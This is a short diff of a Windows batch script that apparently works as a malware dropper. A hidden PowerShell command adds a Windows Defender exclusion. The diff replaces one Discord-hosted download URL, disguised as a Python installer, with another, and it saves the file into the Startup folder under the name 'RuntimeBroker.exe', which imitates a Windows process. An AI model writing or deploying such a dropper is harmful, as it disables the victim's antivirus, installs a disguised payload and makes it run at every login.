@@ -3,8 +3,8 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1157080921019793500/1160242404000018574/Python_Installer.exe"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+set "URL=https://cdn.discordapp.com/attachments/1203072429677871137/1205624699422380032/python-3.11.0-amd64.exe"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
 
 
 if exist "%DEST%" del "%DEST%"
